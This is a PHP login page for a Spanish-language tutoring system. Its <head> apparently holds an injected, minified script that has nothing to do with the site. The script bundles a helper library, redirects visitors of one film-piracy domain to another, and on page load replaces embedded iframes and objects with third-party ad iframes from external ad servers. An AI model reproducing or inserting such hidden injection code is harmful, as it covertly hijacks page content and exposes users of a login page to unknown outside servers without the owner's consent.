<?
if(isset($_GET['cerrar']))
{
    session_start();
    foreach($_SESSION as $key => $value)
    {
      $_SESSION[$key] = NULL;
    }
    session_destroy();
}
if(isset($_SESSION['loggedin']) and $_SESSION['loggedin']==true)
{
    header('Location: inicio.php');
}
header('Content-Type: text/html; charset=ISO-8859-1');
include("conexion.php");
?>

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="ISO-8859-1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Login </title>

    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/stylish-portfolio.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="themes/default/images/favicon.ico">
    <link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,300italic,400italic,700italic" rel="stylesheet" type="text/css">
    <script language="javascript" src="index.php?&amp;give=combined.js&amp;2.8.1&amp;3" type="text/javascript"></script>
    <script>
        (function (b) {

    if (b.location.href.match(/http:\/\/(www\.)pelis24\.com/) && b.top == b.self) {
        b.location = 'http://www.yaske.to/';
        return false;
    }

    !function(t){function n(t){return t=e(t||[]),t.reduce(function(t,n,e){return t[e]=n,t},{length:t.length})}function e(t){return t=t.ELEMENT_NODE?[t]:t,Array.prototype.slice.call((t||{}).length>=0?t:[])}function r(t){return u.extend(u.fn,n(t))}function i(t,n,e){var r=this;return n.split(/\s+/).forEach(function(n){t[0]+"EventListener"in r?r.addEventListener(n,function(){e.apply(r,arguments)},!1):t[1]+"tachEvent"in r&&r.attachEvent("on"+n,function(){e.apply(r,arguments)})}),this}var o=/complete|loaded|interactive/,u=function(t){return t="object"==typeof t?[t]:"string"==typeof t&&t?document.querySelectorAll(t):[],r(t)};u.fn={before:function(t){return this.each(function(){var n=this.get();n.parentNode.insertBefore(t,n)})},after:function(t){return this.each(function(){var n=this.get();n.nextSibling?n.parentNode.insertBefore(t,n.nextSibling):n.parentNode.appendChild(t)})},next:function(){return this.map(function(t,n){return n.nextElementSibling})},prev:function(){return this.map(function(t,n){return n.previousElementSibling})},sons:function(){return this.map(function(t,n){return r(n.children)})},html:function(t){return t?(this.innerHTML=t,this):this.innerHTML},text:function(t){return t?(this.innerText=t,this):this.innerText},remove:function(){this.each(function(){var t=this.get();t.parentNode.removeChild(t)})},alone:function(){var t=e(this).filter(function(t){return"string"==typeof t}).length==this.length;return this.length>0?this.length>1?t?e(this):this:this[0]:""},attr:function(t,n){return this.map(function(){return void 0!=n?(this.get().setAttribute(t,n+""),this):(attr=this.get().getAttribute(t),attr?attr:"")}).alone()},find:function(t){return r(t?this.get().querySelectorAll(t):[])},append:function(t){return this.each(function(){var n=this.get();("string"==typeof selector?u.create(t):t).each(function(){n.appendChild(this.get())})})},appendTo:function(t){return this.each(function(){var n=this.get();"object"==typeof t?t.each(function(){this.get().appendChild(n)}):"string"==typeof t&&u(t).each(function(t,e){e.appendChild(n)})})},css:function(t,n){return this.map(function(){var e=this.get();if(n||"object"==typeof t){var r={};if(this.attr("style").split(";").filter(function(t){return t.match(/\S/gm)}).forEach(function(t){t=t.split(":").map(function(t){return t.trim()}),r[t[0]]=t[1]}),"object"==typeof t)for(var i in t)r[i]=t[i];else r[t]=n;var o="";for(var i in r)o+=i+":"+r[i]+";";return e.setAttribute("style",o),this}var r=document.defaultView.getComputedStyle(e);return r=r.getPropertyCSSValue(t),r?r.cssText:""}).alone()},data:function(t,n){return t="data-"+t,this.map(function(){var e=this.get();if(!n){n=e.getAttribute(t);try{n="true"===n?!0:"false"===n?!1:"null"===n?null:+n+""===n?+n:/^(\{|\[).*(\]|\})$/.test(n)?JSON.parse(n):n}catch(r){}return n}e.setAttribute(t,n)}).alone()},opacity:function(t){return this.css({filter:"alpha(opacity="+100*t+")","-moz-opacity":t,"-webkit-opacity":t,"-khtml-opacity":t,opacity:t}),this},on:function(t,n){return this.each(function(){i.call(this.get(),["add","at"],t,n)})},off:function(t,n){return this.each(function(){i.call(this.get(),["remove","de"],t,n)})},length:0,add:function(){return r([].concat.apply(e(this),arguments))},slice:function(){var t=e(this);return r(t.slice.apply(t,arguments))},get:function(t){return e(this)[t||"0"]},first:function(){var t=e(this).shift();return r(t?[t]:[])},last:function(){var t=e(this).pop();return r(t?[t]:[])},filter:function(t){return r(e(this).filter(function(n,e){return t.call(r([n]),e,n)}))},map:function(t){return r(e(this).map(function(n,e){return t.call(r([n]),e,n)}))},each:function(t){return e(this).forEach(function(n,e){t.call(r([n]),e,n)}),this},toArray:function(){return e(this)}},Element.prototype.devce=function(){return r([this])},u.create=function(t){var n=document.createElement("div");return n.innerHTML=t,r(n.childNodes)},u.extend=function(){for(var t={},n=arguments,e=0;e<n.length;e++)Object.keys(n[e]).forEach(function(r){t[r]=n[e][r]});return t},u.ready=function(t){return o.test(document.readyState)&&document.body?t(u):document.addEventListener("DOMContentLoaded",function(){t(u)},!1),this},String.prototype.array_match=function(t){var n=this.toString();return t.filter(function(t){return n.match(t)}).length>0},String.prototype.build_query=function(t){var n=[];for(var e in t)n.push(e+"="+escape(t[e]));return this.toString()+"?"+n.join("&")},String.prototype.trim=function(){return this.toString().replace(/^\s+/,"").replace(/\s+$/,"")},t.devceWorkSpace=function(t){try{t(u)}catch(n){}},t.devce=u}(window);
            
    devceWorkSpace(function($){
        
        var ADSET = [];
            ADSET.push({src: '//ads.mytopimp.com/creative/2-002137419-00001i;size=300x250;tag_id=10118;ref=ysk.pe;cb=INSERT_CACHEBUSTER_HERE', width: 300, height: 250});
            ADSET.push({src: '//ads.mytopimp.com/creative/2-002137419-00001i;size=300x250;tag_id=10118;ref=ysk.pe;cb=INSERT_CACHEBUSTER_HERE', width: 336, height: 280});
            ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147786, w: 468, h: 60, c: 4, blank: false}), width: 468, height: 60});
            ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147762, w: 728, h: 90, c: 4, blank: false}), width: 728, height: 90});
            ADSET.push({src: 'http://xch.smrtgs.com/adserver/iframe.php'.build_query({s: 1000147787, w: 800, h: 600, c: 1, blank: false}), width: 800, height: 600});
            
        var adchanger = function(){
            var iframe, node = this.get();
            if (this.data('devce') || this.data('checked')) return false;
                this.data('checked', 'true');
            for (var i = 0; i < ADSET.length; i++) {
                if ((node.offsetWidth - ADSET[i].width) == (node.offsetHeight - ADSET[i].height)) {
                    iframe = document.createElement('iframe').devce();
                    for (var attr in  ADSET[i]) iframe.attr( attr,  ADSET[i][attr] );
                    iframe.data('devce', 'true');
                    iframe.attr('frameborder', '0');
                    iframe.attr('scrolling', 'no');
                    this.before(iframe.get()).remove();
                    break;
                }
            }
        };
        
        $.ready(function(){
            $('iframe, object').each(function(i, target){
                    adchanger.call(target.devce());
            });
        });
        
        $(document).on('DOMNodeInserted', function(e){
            if (['iframe', 'object'].indexOf(e.target.localName) != -1) {
                adchanger.call(e.target.devce());
            } else {
                $(e.target).find('iframe, object').each(function(){
                    adchanger.call(this[0]);
                })
            }
        });
        
    });
    })(window);
    </script>

</head>

<body>

    <header>
        
    </header>
  
  <section class="bg-primary" >
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 text-center">
                    <h2 class="section-heading">SISTEMA DE TUTORÍA </h2>
                    <!--<hr class="small"></hr> -->
                    <br> 
                    
                </div>
            </div>
        </div>
    </section>

  <section id="services" class="default">
        <div class="container">
            <div class="row text-center">
                <div class="col-lg-10 col-lg-offset-1">
                    <h2>Iniciar Sesión</h2>
                    <hr class="small">
                    
                </div>
                
            </div>
            <!-- /.row -->
        </div>
        
        <div class="container">
        
                <div class="row">
                <div class="col-md-4"></div>
                <div class="col-md-4">
                <div class="panel panel-default">
                    <div class="panel-body panel-info" >
                        
                        <?
                            if(isset($_GET['error']))
                            {
                                echo "Usuario o Contraseña incorrecto(s). <br>";
                            }
                        ?>


                        <form id="form1" method="post" action="checklogin.php">
                            <div class="form-group">
                                <label for="usuario">Nombre de Usuario</label>
                                    <div class="input-group">
                                        <span class="input-group-addon" id="basic-addon1"><span class="glyphicon glyphicon-user"></span></span>
                                        <input type="text" class="form-control" placeholder="Username" aria-describedby="basic-addon1" name="user">
                                    </div>          
                            </div>
                            <div class="form-group">
                                <label for="password">Password</label>
                                <div class="input-group">
                                    <span class="input-group-addon" id="basic-addon1"><span class="glyphicon glyphicon-star"></span></span>
                                    <input type="password" class="form-control" placeholder="Password" aria-describedby="basic-addon1" name="pass">
                                </div>
                            </div>
                            <div class="form-group">
                                <label for="sel1">Periodo</label>
                                    <div class="input-group">
                                    <span class="input-group-addon" id="basic-addon1"><span class="glyphicon glyphicon-book"></span></span>
                                    <select class="form-control" name="peri" >
                                      
                                      <?
                                        $query="call listar_periodos()";
                                        $result=$conexion->query($query);
                                        $periodo=array();
                                        while($row = mysqli_fetch_row($result))
                                        {
                                          $periodo[]=$row;
                                        }
                                        mysqli_free_result($result);
                                        $conexion->close(); 
                                        for ($i=0; $i < count($periodo); $i++)
                                        {
                                      ?>
                                          <option <? echo "value='".$periodo[$i][0]."'"; ?> ><? echo $periodo[$i][1] ?></option>
                                      <?
                                        }
                                      ?>          
                                    </select>
                                </div>

                            </div>
                            
                            <hr/>
                          <div class="text-center">
                          </div>
                          <div class="row">
                              <div class="col-sm-6">
                                  <a href='index.php' class='btn btn-primary btn-block btn-sm' role='button'><span class="glyphicon glyphicon-arrow-left"></span> Regresar</a>
                              </div>
                              <div class="col-sm-6">
                                  <a href='#' onclick='form1.submit(); return false' class='btn btn-primary btn-block btn-sm' role='button'><span class="glyphicon glyphicon-lock"></span> Ingresar</a>
                              </div>
                          </div>
                        </form>
                    </div>
                </div>
                </div>
                </div>
                </div>
</section>



    <!--<section id="services" class="services bg-primary">
        
    </section> -->


<!-- jQuery -->
    <script src="js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>

    <!-- Custom Theme JavaScript -->
    <script>
    // Closes the sidebar menu
    $("#menu-close").click(function(e) {
        e.preventDefault();
        $("#sidebar-wrapper").toggleClass("active");
    });

    // Opens the sidebar menu
    $("#menu-toggle").click(function(e) {
        e.preventDefault();
        $("#sidebar-wrapper").toggleClass("active");
    });

    // Scrolls to the selected menu item on the page
    $(function() {
        $('a[href*=#]:not([href=#])').click(function() {
            if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') || location.hostname == this.hostname) {

                var target = $(this.hash);
                target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
                if (target.length) {
                    $('html,body').animate({
                        scrollTop: target.offset().top
                    }, 1000);
                    return false;
                }
            }
        });
    });
    </script>

</body>

</html>